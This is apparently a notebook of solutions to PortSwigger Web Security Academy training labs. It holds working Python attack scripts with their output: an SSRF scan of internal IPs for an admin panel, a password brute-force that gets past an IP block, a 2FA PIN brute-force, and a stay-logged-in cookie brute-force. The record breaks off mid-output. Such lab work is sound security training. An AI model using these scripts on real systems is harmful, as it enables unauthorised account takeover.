# %% [markdown]
# <a href="https://colab.research.google.com/github/lucabk/PortSwigger-Academy/blob/main/PortSwigger_Academy.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# # **1 - Server-side vulnerabilities**

# %% [markdown]
# ## SSRF

# %%
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%
def check_admin_page(url):
  check_stock_path = "/product/stock"
  for n in range(1,255):
    body = {"stockApi" : f"http://192.168.0.{n}:8080/admin"}
    r = requests.post(url + check_stock_path, data=body, verify=False)
    if(r.status_code != 500):
      print(f"IP: 192.168.0.{n} \t STATUS CODE: {r.status_code} \n RESPONSE: {r.text}")

# %%
check_admin_page("https://0a17002c04d475aa8185ded3008400b6.web-security-academy.net")
# Out:
# IP: 192.168.0.1 	 STATUS CODE: 400
#  RESPONSE: "Missing parameter"
# IP: 192.168.0.212 	 STATUS CODE: 200
#  RESPONSE: <!DOCTYPE html>
# <html>
#     <head>
#         <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
#         <link href=/resources/css/labs.css rel=stylesheet>
#         <title>Basic SSRF against another back-end system</title>
#     </head>
#     <body>
#         <script src="/resources/labheader/js/labHeader.js"></script>
#         <div id="academyLabHeader">
#             <section class='academyLabBanner is-solved'>
#                 <div class=container>
#                     <div class=logo></div>
#                         <div class=title-container>
#                             <h2>Basic SSRF against another back-end system</h2>
#                             <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system'>
#                                 Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
#                                 <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
#                                     <g>
#                                         <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
#                                         <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
#                                     </g>
#                                 </svg>
#                             </a>
#                         </div>
#                         <div class='widgetcontainer-lab-status is-solved'>
#                             <span>LAB</span>
#                             <p>Solved</p>
#                             <span class=lab-status-icon></span>
#                         </div>
#                     </div>
#                 </div>
#             </section>
#             <section id=notification-labsolved class=notification-labsolved>
#                 <div class=container>
#                     <h4>Congratulations, you solved the lab!</h4>
#                     <div>
#                         <span>
#                             Share your skills!
#                         </span>
#                         <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aBasic+SSRF+against+another+back-end+system%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fssrf%2flab-basic-ssrf-against-backend-system&related=WebSecAcademy,Burp_Suite'>
#                     <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
#                         <title>twitter-button</title>
#                         <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
#                     </svg>
#                         </a>
#                         <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fssrf%2flab-basic-ssrf-against-backend-system'>
#                     <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
#                         <title>linkedin-button</title>
#                         <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
#                     </svg>
#                         </a>
#                         <a href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system'>
#                             Continue learning
#                             <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
#                                 <g>
#                                     <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
#                                     <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
#                                 </g>
#                             </svg>
#                         </a>
#                     </div>
#                 </div>
#             </section>
#         </div>
#         <div theme="">
#             <section class="maincontainer">
#                 <div class="container is-page">
#                     <header class="navigation-header">
#                         <section class="top-links">
#                             <a href=/>Home</a><p>|</p>
#                             <a href="/admin">Admin panel</a><p>|</p>
#                             <a href="/my-account">My account</a><p>|</p>
#                         </section>
#                     </header>
#                     <header class="notification-header">
#                     </header>
#                     <section>
#                         <h1>Users</h1>
#                         <div>
#                             <span>wiener - </span>
#                             <a href="/http://192.168.0.212:8080/admin/delete?username=wiener">Delete</a>
#                         </div>
#                     </section>
#                     <br>
#                     <hr>
#                 </div>
#             </section>
#             <div class="footer-wrapper">
#             </div>
#         </div>
#     </body>
# </html>

# %% [markdown]
# # **2 - Authentication vulnerabilities**

# %% [markdown]
# ## Lab: Broken brute-force protection, IP block
#
# This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
#
# *   Your credentials: wiener:peter
# *   Victim's username: carlos

# %%
! wc -l credentials/passwords.txt
# Out:
# 99 credentials/passwords.txt

# %%
import requests as re
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%
def read_passwords(filename)->list:
  with open(filename) as pass_file:
    return pass_file.read().split('\n')

# %%
correct_creds = {
    'username' : 'wiener',
    'password' : 'peter'
  }

brute_creds = {
    'username' : 'carlos',
    'password' : 'password'
}

# %%
def login(creds:list, url:str):
  for p in creds:
    brute_creds['password'] = p
    print(f"Trying carlos:{p}")
    res = re.post(url, allow_redirects=False, data=brute_creds)
    print(f"Response: {res.status_code}")
    if (res.status_code == 302):
      print(f"Credenziali trovate: carlos:{p}")
      break
    re.post(url, allow_redirects=False, data=correct_creds)

# %%
login(read_passwords("credentials/passwords.txt"), "https://0a6f002f03cfc19d80d54ea4004c00ce.web-security-academy.net/login")
# Out:
# Trying carlos:123456
# Response: 200
# Trying carlos:password
# Response: 200
# Trying carlos:12345678
# Response: 200
# Trying carlos:qwerty
# Response: 200
# Trying carlos:123456789
# Response: 200
# Trying carlos:12345
# Response: 200
# Trying carlos:1234
# Response: 200
# Trying carlos:111111
# Response: 200
# Trying carlos:1234567
# Response: 200
# Trying carlos:dragon
# Response: 200
# Trying carlos:123123
# Response: 200
# Trying carlos:baseball
# Response: 200
# Trying carlos:abc123
# Response: 200
# Trying carlos:football
# Response: 200
# Trying carlos:monkey
# Response: 200
# Trying carlos:letmein
# Response: 200
# Trying carlos:shadow
# Response: 200
# Trying carlos:master
# Response: 200
# Trying carlos:666666
# Response: 200
# Trying carlos:qwertyuiop
# Response: 200
# Trying carlos:123321
# Response: 200
# Trying carlos:mustang
# Response: 200
# Trying carlos:1234567890
# Response: 200
# Trying carlos:michael
# Response: 200
# Trying carlos:654321
# Response: 200
# Trying carlos:superman
# Response: 200
# Trying carlos:1qaz2wsx
# Response: 200
# Trying carlos:7777777
# Response: 200
# Trying carlos:121212
# Response: 200
# Trying carlos:000000
# Response: 200
# Trying carlos:qazwsx
# Response: 200
# Trying carlos:123qwe
# Response: 200
# Trying carlos:killer
# Response: 200
# Trying carlos:trustno1
# Response: 200
# Trying carlos:jordan
# Response: 200
# Trying carlos:jennifer
# Response: 200
# Trying carlos:zxcvbnm
# Response: 200
# Trying carlos:asdfgh
# Response: 200
# Trying carlos:hunter
# Response: 200
# Trying carlos:buster
# Response: 200
# Trying carlos:soccer
# Response: 200
# Trying carlos:harley
# Response: 200
# Trying carlos:batman
# Response: 200
# Trying carlos:andrew
# Response: 200
# Trying carlos:tigger
# Response: 200
# Trying carlos:sunshine
# Response: 200
# Trying carlos:iloveyou
# Response: 200
# Trying carlos:2000
# Response: 200
# Trying carlos:charlie
# Response: 200
# Trying carlos:robert
# Response: 200
# Trying carlos:thomas
# Response: 200
# Trying carlos:hockey
# Response: 200
# Trying carlos:ranger
# Response: 200
# Trying carlos:daniel
# Response: 200
# Trying carlos:starwars
# Response: 200
# Trying carlos:klaster
# Response: 200
# Trying carlos:112233
# Response: 302
# Credenziali trovate: carlos:112233

# %% [markdown]
# ## Lab: 2FA broken logic

# %% [markdown]
# This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
#
# * Your credentials: wiener:peter
# * Victim's username: carlos
#
# You also have access to the email server to receive your 2FA verification code.

# %%
import requests as re

def brute_pin(url, username):

  cookies = {
      'verify' : username
  }

  data = {
      'mfa-code' : 0
  }

  headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
  }

  for pin in range(10000):
    data['mfa-code'] = f"{pin:04d}"
    res = re.post(url, cookies=cookies, data=data, headers=headers, allow_redirects=False)
    print(f"PIN : {data['mfa-code']}, STATUS CODE: {res.status_code}")
    if(res.status_code == 302):
      print(f"Found PIN: {data['mfa-code']}")
      break

# %%
brute_pin('https://0a2200100457826a80ddc1a500440091.web-security-academy.net/login2', 'carlos')
# Out:
# PIN : 0000, STATUS CODE: 200
# PIN : 0001, STATUS CODE: 200
# PIN : 0002, STATUS CODE: 200
# PIN : 0003, STATUS CODE: 200
# PIN : 0004, STATUS CODE: 200
# PIN : 0005, STATUS CODE: 200
# PIN : 0006, STATUS CODE: 200
# PIN : 0007, STATUS CODE: 200
# PIN : 0008, STATUS CODE: 200
# PIN : 0009, STATUS CODE: 200
# PIN : 0010, STATUS CODE: 200
# PIN : 0011, STATUS CODE: 200
# PIN : 0012, STATUS CODE: 200
# PIN : 0013, STATUS CODE: 200
# PIN : 0014, STATUS CODE: 200
# PIN : 0015, STATUS CODE: 200
# PIN : 0016, STATUS CODE: 200
# PIN : 0017, STATUS CODE: 200
# PIN : 0018, STATUS CODE: 200
# PIN : 0019, STATUS CODE: 200
# PIN : 0020, STATUS CODE: 200
# PIN : 0021, STATUS CODE: 200
# PIN : 0022, STATUS CODE: 200
# PIN : 0023, STATUS CODE: 200
# PIN : 0024, STATUS CODE: 200
# PIN : 0025, STATUS CODE: 200
# PIN : 0026, STATUS CODE: 200
# PIN : 0027, STATUS CODE: 200
# PIN : 0028, STATUS CODE: 200
# PIN : 0029, STATUS CODE: 200
# PIN : 0030, STATUS CODE: 200
# PIN : 0031, STATUS CODE: 200
# PIN : 0032, STATUS CODE: 200
# PIN : 0033, STATUS CODE: 200
# PIN : 0034, STATUS CODE: 200
# PIN : 0035, STATUS CODE: 200
# PIN : 0036, STATUS CODE: 200
# PIN : 0037, STATUS CODE: 200
# PIN : 0038, STATUS CODE: 200
# PIN : 0039, STATUS CODE: 200
# PIN : 0040, STATUS CODE: 200
# PIN : 0041, STATUS CODE: 200
# PIN : 0042, STATUS CODE: 200
# PIN : 0043, STATUS CODE: 200
# PIN : 0044, STATUS CODE: 200
# PIN : 0045, STATUS CODE: 200
# PIN : 0046, STATUS CODE: 200
# PIN : 0047, STATUS CODE: 200
# PIN : 0048, STATUS CODE: 200
# PIN : 0049, STATUS CODE: 200
# PIN : 0050, STATUS CODE: 200
# PIN : 0051, STATUS CODE: 200
# PIN : 0052, STATUS CODE: 200
# PIN : 0053, STATUS CODE: 200
# PIN : 0054, STATUS CODE: 200
# PIN : 0055, STATUS CODE: 200
# PIN : 0056, STATUS CODE: 200
# PIN : 0057, STATUS CODE: 200
# PIN : 0058, STATUS CODE: 200
# PIN : 0059, STATUS CODE: 200
# PIN : 0060, STATUS CODE: 200
# PIN : 0061, STATUS CODE: 200
# PIN : 0062, STATUS CODE: 200
# PIN : 0063, STATUS CODE: 200
# PIN : 0064, STATUS CODE: 200
# PIN : 0065, STATUS CODE: 200
# PIN : 0066, STATUS CODE: 200
# PIN : 0067, STATUS CODE: 200
# PIN : 0068, STATUS CODE: 200
# PIN : 0069, STATUS CODE: 200
# PIN : 0070, STATUS CODE: 200
# PIN : 0071, STATUS CODE: 200
# PIN : 0072, STATUS CODE: 200
# PIN : 0073, STATUS CODE: 200
# PIN : 0074, STATUS CODE: 200
# PIN : 0075, STATUS CODE: 200
# PIN : 0076, STATUS CODE: 200
# PIN : 0077, STATUS CODE: 200
# PIN : 0078, STATUS CODE: 200
# PIN : 0079, STATUS CODE: 200
# PIN : 0080, STATUS CODE: 200
# PIN : 0081, STATUS CODE: 200
# PIN : 0082, STATUS CODE: 200
# PIN : 0083, STATUS CODE: 200
# PIN : 0084, STATUS CODE: 200
# PIN : 0085, STATUS CODE: 200
# PIN : 0086, STATUS CODE: 200
# PIN : 0087, STATUS CODE: 200
# PIN : 0088, STATUS CODE: 200
# PIN : 0089, STATUS CODE: 200
# PIN : 0090, STATUS CODE: 200
# PIN : 0091, STATUS CODE: 200
# PIN : 0092, STATUS CODE: 200
# PIN : 0093, STATUS CODE: 200
# PIN : 0094, STATUS CODE: 200
# PIN : 0095, STATUS CODE: 200
# PIN : 0096, STATUS CODE: 200
# PIN : 0097, STATUS CODE: 200
# PIN : 0098, STATUS CODE: 200
# PIN : 0099, STATUS CODE: 200
# PIN : 0100, STATUS CODE: 200
# PIN : 0101, STATUS CODE: 200
# PIN : 0102, STATUS CODE: 200
# PIN : 0103, STATUS CODE: 200
# PIN : 0104, STATUS CODE: 200
# PIN : 0105, STATUS CODE: 200
# PIN : 0106, STATUS CODE: 200
# PIN : 0107, STATUS CODE: 200
# PIN : 0108, STATUS CODE: 200
# PIN : 0109, STATUS CODE: 200
# PIN : 0110, STATUS CODE: 200
# PIN : 0111, STATUS CODE: 200
# PIN : 0112, STATUS CODE: 200
# PIN : 0113, STATUS CODE: 200
# PIN : 0114, STATUS CODE: 200
# PIN : 0115, STATUS CODE: 200
# PIN : 0116, STATUS CODE: 200
# PIN : 0117, STATUS CODE: 200
# PIN : 0118, STATUS CODE: 200
# PIN : 0119, STATUS CODE: 200
# PIN : 0120, STATUS CODE: 200
# PIN : 0121, STATUS CODE: 200
# PIN : 0122, STATUS CODE: 200
# PIN : 0123, STATUS CODE: 200
# PIN : 0124, STATUS CODE: 200
# PIN : 0125, STATUS CODE: 200
# PIN : 0126, STATUS CODE: 200
# PIN : 0127, STATUS CODE: 200
# PIN : 0128, STATUS CODE: 200
# PIN : 0129, STATUS CODE: 200
# PIN : 0130, STATUS CODE: 200
# PIN : 0131, STATUS CODE: 200
# PIN : 0132, STATUS CODE: 200
# PIN : 0133, STATUS CODE: 200
# PIN : 0134, STATUS CODE: 200
# PIN : 0135, STATUS CODE: 200
# PIN : 0136, STATUS CODE: 200
# PIN : 0137, STATUS CODE: 200
# PIN : 0138, STATUS CODE: 200
# PIN : 0139, STATUS CODE: 200
# PIN : 0140, STATUS CODE: 200
# PIN : 0141, STATUS CODE: 200
# PIN : 0142, STATUS CODE: 200
# PIN : 0143, STATUS CODE: 200
# PIN : 0144, STATUS CODE: 200
# PIN : 0145, STATUS CODE: 200
# PIN : 0146, STATUS CODE: 200
# PIN : 0147, STATUS CODE: 200
# PIN : 0148, STATUS CODE: 200
# PIN : 0149, STATUS CODE: 200
# PIN : 0150, STATUS CODE: 200
# PIN : 0151, STATUS CODE: 200
# PIN : 0152, STATUS CODE: 200
# PIN : 0153, STATUS CODE: 200
# PIN : 0154, STATUS CODE: 200
# PIN : 0155, STATUS CODE: 200
# PIN : 0156, STATUS CODE: 200
# PIN : 0157, STATUS CODE: 200
# PIN : 0158, STATUS CODE: 200
# PIN : 0159, STATUS CODE: 200
# PIN : 0160, STATUS CODE: 200
# PIN : 0161, STATUS CODE: 200
# PIN : 0162, STATUS CODE: 200
# PIN : 0163, STATUS CODE: 200
# PIN : 0164, STATUS CODE: 200
# PIN : 0165, STATUS CODE: 200
# PIN : 0166, STATUS CODE: 200
# PIN : 0167, STATUS CODE: 200
# PIN : 0168, STATUS CODE: 200
# PIN : 0169, STATUS CODE: 200
# PIN : 0170, STATUS CODE: 200
# PIN : 0171, STATUS CODE: 200
# PIN : 0172, STATUS CODE: 200
# PIN : 0173, STATUS CODE: 200
# PIN : 0174, STATUS CODE: 200
# PIN : 0175, STATUS CODE: 200
# PIN : 0176, STATUS CODE: 200
# PIN : 0177, STATUS CODE: 200
# PIN : 0178, STATUS CODE: 200
# PIN : 0179, STATUS CODE: 200
# PIN : 0180, STATUS CODE: 200
# PIN : 0181, STATUS CODE: 200
# PIN : 0182, STATUS CODE: 200
# PIN : 0183, STATUS CODE: 200
# PIN : 0184, STATUS CODE: 200
# PIN : 0185, STATUS CODE: 200
# PIN : 0186, STATUS CODE: 200
# PIN : 0187, STATUS CODE: 200
# PIN : 0188, STATUS CODE: 200
# PIN : 0189, STATUS CODE: 200
# PIN : 0190, STATUS CODE: 200
# PIN : 0191, STATUS CODE: 200
# PIN : 0192, STATUS CODE: 200
# PIN : 0193, STATUS CODE: 200
# PIN : 0194, STATUS CODE: 200
# PIN : 0195, STATUS CODE: 200
# PIN : 0196, STATUS CODE: 200
# PIN : 0197, STATUS CODE: 200
# PIN : 0198, STATUS CODE: 200
# PIN : 0199, STATUS CODE: 200
# PIN : 0200, STATUS CODE: 200
# PIN : 0201, STATUS CODE: 200
# PIN : 0202, STATUS CODE: 200
# PIN : 0203, STATUS CODE: 200
# PIN : 0204, STATUS CODE: 200
# PIN : 0205, STATUS CODE: 200
# PIN : 0206, STATUS CODE: 200
# PIN : 0207, STATUS CODE: 200
# PIN : 0208, STATUS CODE: 200
# PIN : 0209, STATUS CODE: 200
# PIN : 0210, STATUS CODE: 200
# PIN : 0211, STATUS CODE: 200
# PIN : 0212, STATUS CODE: 200
# PIN : 0213, STATUS CODE: 200
# PIN : 0214, STATUS CODE: 200
# PIN : 0215, STATUS CODE: 200
# PIN : 0216, STATUS CODE: 200
# PIN : 0217, STATUS CODE: 200
# PIN : 0218, STATUS CODE: 200
# PIN : 0219, STATUS CODE: 200
# PIN : 0220, STATUS CODE: 200
# PIN : 0221, STATUS CODE: 200
# PIN : 0222, STATUS CODE: 200
# PIN : 0223, STATUS CODE: 200
# PIN : 0224, STATUS CODE: 200
# PIN : 0225, STATUS CODE: 200
# PIN : 0226, STATUS CODE: 200
# PIN : 0227, STATUS CODE: 200
# PIN : 0228, STATUS CODE: 200
# PIN : 0229, STATUS CODE: 200
# PIN : 0230, STATUS CODE: 302
# Found PIN: 0230

# %% [markdown]
# ## Lab: Brute-forcing a stay-logged-in cookie

# %% [markdown]
# This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
#
# To solve the lab, brute-force Carlos's cookie to gain access to his My account page.
#
# * Your credentials: wiener:peter
# * Victim's username: carlos
#
# List Candidate passwords....

# %%
! wc -l passwords.txt
# Out:
# 99 passwords.txt

# %%
import hashlib
import base64

def hash_md5(input_string):
  """Hashes a string using MD5 and returns the hexadecimal representation."""
  md5_hash = hashlib.md5()
  md5_hash.update(input_string.encode('utf-8'))
  return md5_hash.hexdigest()

def encode_base64(input_bytes):
  """Encodes bytes using Base64."""
  return base64.b64encode(input_bytes)

# Example usage:
# text_to_hash = "mysecretpassword"
# md5_hashed_text = hash_md5(text_to_hash)

# encode the MD5 hash (as bytes)
# md5_hashed_bytes = md5_hashed_text.encode('utf-8')
# base64_encoded_md5 = encode_base64(md5_hashed_bytes)

# %%
## Schema usato: Base64("username:MD5(password)")

def generate_cookie(passwords: list, username: str) -> list:
  cookies = []
  for p in passwords:
    # Encode the string to bytes before passing it to encode_base64
    cookie_string = f"{username}:{hash_md5(p)}".encode('utf-8')
    cookies.append((p, encode_base64(cookie_string).decode('utf-8'))) # Decode back to string for easier use
  return cookies

# %%
import requests as re

def brute_cookie(url, username, passwords):

  cookies = {
      'stay-logged-in' : 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw'
  }

  headers = {
      'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
  }

  for cookie_string in generate_cookie(passwords, username):
    cookies['stay-logged-in'] = cookie_string[1]
    print(f"Trying cookie: {cookie_string}...")
    res = re.get(url, allow_redirects=False, cookies=cookies)
    print(f"Status code: {res.status_code}")
    if(res.status_code == 200):
      print(f"Cookie trovato!")
      break

# %%
brute_cookie("https://0ad6004f04f00f6280b4da72002000a4.web-security-academy.net/my-account?id=carlos", "carlos", read_passwords('passwords.txt'))
# Out:
# Trying cookie: ('123456', 'Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl')...
# Status code: 302
# Trying cookie: ('peter', 'Y2FybG9zOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw')...
# Status code: 302
# Trying cookie: ('password', 'Y2FybG9zOjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5')...
# Status code: 302
# Trying cookie: ('12345678', 'Y2FybG9zOjI1ZDU1YWQyODNhYTQwMGFmNDY0Yzc2ZDcxM2MwN2Fk')...
# Status code: 302
# Trying cookie: ('qwerty', 'Y2FybG9zOmQ4NTc4ZWRmODQ1OGNlMDZmYmM1YmI3NmE1OGM1Y2E0')...
# Status code: 302
# Trying cookie: ('123456789', 'Y2FybG9zOjI1ZjllNzk0MzIzYjQ1Mzg4NWY1MTgxZjFiNjI0ZDBi')...
# Status code: 302
# Trying cookie: ('12345', 'Y2FybG9zOjgyN2NjYjBlZWE4YTcwNmM0YzM0YTE2ODkxZjg0ZTdi')...
# Status code: 302
# Trying cookie: ('1234', 'Y2FybG9zOjgxZGM5YmRiNTJkMDRkYzIwMDM2ZGJkODMxM2VkMDU1')...
# Status code: 302
# Trying cookie: ('111111', 'Y2FybG9zOjk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy')...
# Status code: 302
# Trying cookie: ('1234567', 'Y2FybG9zOmZjZWE5MjBmNzQxMmI1ZGE3YmUwY2Y0MmI4YzkzNzU5')...
# Status code: 302
# Trying cookie: ('dragon', 'Y2FybG9zOjg2MjFmZmRiYzU2OTg4MjkzOTdkOTc3NjdhYzEzZGIz')...
# Status code: 302
# Trying cookie: ('123123', 'Y2FybG9zOjQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YTkz')...
# Status code: 302
# Trying cookie: ('baseball', 'Y2FybG9zOjI3NmY4ZGIwYjg2ZWRhYTdmYzgwNTUxNmM4NTJjODg5')...
# Status code: 302
# Trying cookie: ('abc123', 'Y2FybG9zOmU5OWExOGM0MjhjYjM4ZDVmMjYwODUzNjc4OTIyZTAz')...
# Status code: 302
# Trying cookie: ('football', 'Y2FybG9zOjM3YjRlMmQ4MjkwMGQ1ZTk0YjhkYTUyNGZiZWIzM2Mw')...
# Status code: 302
# Trying cookie: ('monkey', 'Y2FybG9zOmQwNzYzZWRhYTlkOWJkMmE5NTE2MjgwZTkwNDRkODg1')...
# Status code: 302
# Trying cookie: ('letmein', 'Y2FybG9zOjBkMTA3ZDA5ZjViYmU0MGNhZGUzZGU1YzcxZTllOWI3')...
# Status code: 302
# Trying cookie: ('shadow', 'Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4')...
# Status code: 302
# Trying cookie: ('master', 'Y2FybG9zOmViMGExOTE3OTc2MjRkZDNhNDhmYTY4MWQzMDYxMjEy')...
# Status code: 302
# Trying cookie: ('666666', 'Y2FybG9zOmYzNzllYWYzYzgzMWIwNGRlMTUzNDY5ZDFiZWMzNDVl')...
# Status code: 302
# Trying cookie: ('qwertyuiop', 'Y2FybG9zOjZlZWE5YjdlZjE5MTc5YTA2OTU0ZWRkMGY2YzA1Y2Vi')...
# Status code: 302
# Trying cookie: ('123321', 'Y2FybG9zOmM4ODM3YjIzZmY4YWFhOGEyZGRlOTE1NDczY2UwOTkx')...
# Status code: 302
# Trying cookie: ('mustang', 'Y2FybG9zOmJlZTc4M2VlMjk3NDU5NTQ4NzM1N2UxOTVlZjM4Y2Ey')...
# Status code: 302
# Trying cookie: ('1234567890', 'Y2FybG9zOmU4MDdmMWZjZjgyZDEzMmY5YmIwMThjYTY3MzhhMTlm')...
# Status code: 302
# Trying cookie: ('michael', 'Y2FybG9zOjBhY2Y0NTM5YTE0YjNhYTI3ZGVlYjRjYmRmNmU5ODlm')...
# Status code: 302
# Trying cookie: ('654321', 'Y2FybG9zOmMzMzM2NzcwMTUxMWI0ZjYwMjBlYzYxZGVkMzUyMDU5')...
# Status code: 302
# Trying cookie: ('superman', 'Y2FybG9zOjg0ZDk2MTU2OGE2NTA3M2EzYmNmMGViMjE2YjJhNTc2')...
# Status code: 302
# Trying cookie: ('1qaz2wsx', 'Y2FybG9zOjFjNjMxMjlhZTlkYjljNjBjM2U4YWE5NGQzZTAwNDk1')...
# Status code: 302
# Trying cookie: ('7777777', 'Y2FybG9zOmRjMGZhN2RmM2QwNzkwNGEwOTI4OGJkMmQyYmI1ZjQw')...
# Status code: 302
# Trying cookie: ('121212', 'Y2FybG9zOjkzMjc5ZTMzMDhiZGJiZWVkOTQ2ZmM5NjUwMTdmNjdh')...
# Status code: 302
# Trying cookie: ('000000', 'Y2FybG9zOjY3MGIxNDcyOGFkOTkwMmFlY2JhMzJlMjJmYTRmNmJk')...
# Status code: 302
# Trying cookie: ('qazwsx', 'Y2FybG9zOjc2NDE5YzU4NzMwZDlmMzVkZTdhYzUzOGMyZmQ2NzM3')...
# Status code: 302
# Trying cookie: ('123qwe', 'Y2FybG9zOjQ2Zjk0YzhkZTE0ZmIzNjY4MDg1MDc2OGZmMWI3ZjJh')...
# Status code: 302
# Trying cookie: ('killer', 'Y2FybG9zOmIzNmQzMzE0NTFhNjFlYjJkNzY4NjBlMDBjMzQ3Mzk2')...
# Status code: 302
# Trying cookie: ('trustno1', 'Y2FybG9zOjVmY2ZkNDFlNTQ3YTEyMjE1YjE3M2ZmNDdmZGQzNzM5')...
# Status code: 302
# Trying cookie: ('jordan', 'Y2FybG9zOmQxNmQzNzdhZjc2Yzk5ZDI3MDkzYWJjMjIyNDRiMzQy')...
# Status code: 302
# Trying cookie: ('jennifer', 'Y2FybG9zOjE2NjBmZTVjODFjNGNlNjRhMjYxMTQ5NGM0MzllMWJh')...
# Status code: 302
# Trying cookie: ('zxcvbnm', 'Y2FybG9zOjAyYzc1ZmIyMmM3NWIyM2RjOTYzYzdlYjkxYTA2MmNj')...
# Status code: 302
# Trying cookie: ('asdfgh', 'Y2FybG9zOmExNTJlODQxNzgzOTE0MTQ2ZTRiY2Q0ZjM5MTAwNjg2')...
# Status code: 302
# Trying cookie: ('hunter', 'Y2FybG9zOjZiMWIzNmNiYjA0YjQxNDkwYmZjMGFiMmJmYTI2Zjg2')...
# Status code: 302
# Trying cookie: ('buster', 'Y2FybG9zOmQ5YjIzZWJiZjliNDMxZDAwOWEyMGRmNTJlNTE1ZGI1')...
# Status code: 302
# Trying cookie: ('soccer', 'Y2FybG9zOmRhNDQzYTBhZDk3OWQ1NTMwZGYzOGNhMWE3NGU0Zjgw')...
# Status code: 302
# Trying cookie: ('harley', 'Y2FybG9zOmVmNGNkZDMxMTc3OTNiOWZkNTkzZDc0ODg0MDk2MjZk')...
# Status code: 302
# Trying cookie: ('batman', 'Y2FybG9zOmVjMGUyNjAzMTcyYzczYThiNjQ0YmI5NDU2YzFmZjZl')...
# Status code: 302
# Trying cookie: ('andrew', 'Y2FybG9zOmQ5MTRlM2VjZjZjYzQ4MTExNGEzZjUzNGE1ZmFmOTBi')...
# Status code: 302
# Trying cookie: ('tigger', 'Y2FybG9zOmY3OGYyNDc3ZTk0OWJlZTJkMTJhMmM1NDBmYjYwODRm')...
# Status code: 302
# Trying cookie: ('sunshine', 'Y2FybG9zOjA1NzE3NDllMmFjMzMwYTc0NTU4MDljNmIwZTdhZjkw')...
# Status code: 302
# Trying cookie: ('iloveyou', 'Y2FybG9zOmYyNWEyZmM3MjY5MGI3ODBiMmExNGUxNDBlZjZhOWUw')...
# Status code: 302
# Trying cookie: ('2000', 'Y2FybG9zOjA4ZjkwYzFhNDE3MTU1MzYxYTVjNGI4ZDI5N2UwZDc4')...
# Status code: 302
# Trying cookie: ('charlie', 'Y2FybG9zOmJmNzc5ZTA5MzNhODgyODA4NTg1ZDE5NDU1Y2Q3OTM3')...
